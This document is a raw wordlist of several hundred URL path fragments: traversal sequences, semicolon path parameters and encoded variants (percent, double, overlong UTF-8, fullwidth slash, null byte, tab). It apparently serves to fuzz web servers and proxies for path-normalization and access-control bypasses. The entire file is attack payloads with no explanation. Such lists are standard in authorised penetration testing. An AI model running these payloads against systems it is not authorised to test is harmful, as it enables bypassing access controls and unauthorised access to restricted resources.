#
#?
%
&
.
..
../
.././
..;
..;/
..;\
..;\;
..;\\
..\
..\;
..\\
./
./.
.//
.//./
.;
.;/
/
/#
/*
/*/
/.
/..
/../
/../../
/../../../
/../../..//
/../..//
/../..//../
/../..;/
/.././../
/../.;/../
/..//
/..//../
/..//../../
/..//..;/
/../;/
/../;/../
/..;/
/..;/../
/..;/..;/
/..;//
/..;//../
/..;//..;/
/..;/;/
/..;/;/..;/
/./
/.//
/.;
/.;/
/.;//
//
//.
//..
//../../
//..;
//./
//.;/
///
///..
///../
///..//
///..;
///..;/
///..;//
////
///;
///;/
//;
//;/
/;
/;/
/;/../
/;/../../
/;/../..//
/;/.././../
/;/../.;/../
/;/..//
/;/..//../
/;/..///
/;/../;/
/;/../;/../
/;//
/;///
/;?
/?
/?;
;
;/
;/..
;/../
;/../../
;/../..//
;/.././../
;/../.;/../
;/..//
;/..//../
;/..///
;/../;/
;/../;/../
;/..;
;/.;.
;//
;//..
;//../../
;///..
;///../
;///..//
;?
?
?#
?;
??
???
\..\.\
;/$2e%2e%2f..%2f
.%00
.%00/
..%00/
..%00/;
..%00;/
..;%00/
/.%00
/.%00/
%09
%09..
%09../
%09..;
%09..;/
%09/
%09;
%09;/
..%09
;%09
;%09..
;%09..;
;%09;
%09%3b
..%0d/
..%0d/;
..%0d;/
..;%0d/
%20
%20/
%20;
/%20
/%20#
/%20%20/
/%20%23
%23
/%23
%23%3f
/%252e/
/%252e%252e%252f/
/%252e%252e%253b/
/%252e%252f/
/%252e%253b/
%252f/
/%252f
%252f%252f
%26
%2e
%2e/
%2e//
%2e;
%2e;/
%2e;//
.%2e/
/%2e/
/%2e//
;/%2e.
;/.%2e
%2e%2e
%2e%2e/
%2e%2e;
/%2e%2e
/%2e%2e/
/;/..//%2e%2e/
;/%2e%2e
;/%2e%2e/
;/..//%2e%2e/
;/.%2e/%2e%2e/%2f
%2e%2e%2f
/%2e%2e%2f/
;/%2e%2e%2f/
;/%2e%2e%2f%2e%2e%2f
;/%2e%2e%2f%2f
/%2e%2e%3b/
%2e%2f
%2e;%2f
/%2e%2f/
%2e%2f%2f
%2e;%2f%2f
/%2e%3b/
/%2e%3b//
%2f
%2f/
%2f//
%2f;?
%2f?;
..%2f
/%2f
/%2f/
/..%2f
/..;%2f
//%2f
/;/../%2f/
/;/..//%2f
;%2f..
;%2f..//../
;%2f..///
;%2f..///;
;%2f..//;/
;%2f..//;/;
;%2f../;//
;%2f../;/;/
;%2f../;/;/;
;%2f..;///
;%2f..;//;/
;%2f..;/;//
;%2f//../
;%2f//..;/
;%2f/;/../
;%2f/;/..;/
;%2f;//../
;%2f;/;/..;/
;/%2f/../
;/..%2f
;/..%2f/
;/..%2f//
;/../%2f/
;/..//%2f
;//%2f../
;%2F..
%2f%20%23
%2f%23
;%2f%2e%2e
;/..%2f%2e%2e%2f
;%2f%2e%2e%2f%2e%2e%2f%2f
%2f%2f
%2f/%2f
/..%2f..%2f
/..;%2f..;%2f
;%2f%2f/../
;%2f..%2f/
;%2f..%2f/../
;%2f../%2f../
;%2f..//..%2f
;%2f/%2f../
;%2f//..%2f
;/%2f%2f../
;/%2f/..%2f
;/..%2f%2f../
;/..%2f..%2f
;%2f..%2f%2e%2e%2f%2f
%2f%2f%2f
/..%2f..%2f..%2f
/..;%2f..;%2f..;%2f
;%2f..%2f/..%2f
;%2f../%2f..%2f
;%2f..%2f..%2f%2f
%2f%3b%2f
%2f%3b%2f%2f
%2f%3f
%2f%3f/
%3b
%3b/..
/%3b/
..%3B
%3b%09
%3b/%2e.
%3b/%2e%2e/..%2f%2f
%3b%2f..
%3b//%2f../
%3b%2f%2e.
%3b%2f%2e%2e
%3b%2f%2e%2e%2f%2e%2e%2f%2f
%3b/%2f%2f../
%3f
%3f%23
%3f%3f
..%5c
..%5c/
//?anything
%c0%af
%c0%af.
%c0%af.;
%c0%af%c0%af
%c0%af%c0%af..
%c0%af.%c0%af
%c0%af.;%c0%af
%c0%af;%c0%af
%c0%af%c0%af%c0%af
%c0%af.%c0%af%c0%af
%c0%af.;%c0%af%c0%af
%c0%af;%c0%af%c0%af
%c0%af;x/..
%c0%afx%c0%af..
%c0%afx%c0%af..;
%c0%afx;%c0%af..
%c0%afx;%c0%af..;
%ef%bc%8f
%ef%bc%8f.
%ef%bc%8f.;
%ef%bc%8f%ef%bc%8f
%ef%bc%8f%ef%bc%8f..
%ef%bc%8f.%ef%bc%8f
%ef%bc%8f.;%ef%bc%8f
%ef%bc%8f;%ef%bc%8f
%ef%bc%8f%ef%bc%8f%ef%bc%8f
%ef%bc%8f.%ef%bc%8f%ef%bc%8f
%ef%bc%8f.;%ef%bc%8f%ef%bc%8f
%ef%bc%8f;x/..
%ef%bc%8fx%ef%bc%8f..
%ef%bc%8fx%ef%bc%8f..;
%ef%bc%8fx;%ef%bc%8f..
%ef%bc%8fx;%ef%bc%8f..;
..%ff
..%ff/
..%ff/;
..%ff;/
..;%ff/
.html
.json
/.randomstring
%u002e
%u002e;
/%u002e;
%u002e/%u002e
/%u002e/%u002e
/%u002e/%u002e;
/;x
/;x/
/;x;
/x/../
/x/..//
/x/../;/
/x/..;/
/x/..;//
/x/..;/;/
/x//../
/x//..;/
/x/;/../
/x/;/..;/
/x;/..
/x;/../
;x
;x/
;x;
x;/..
x;/../
/x;/%2e%2e
/x;/%2e%2e/
x;/%2e%2e
x;/%2e%2e/
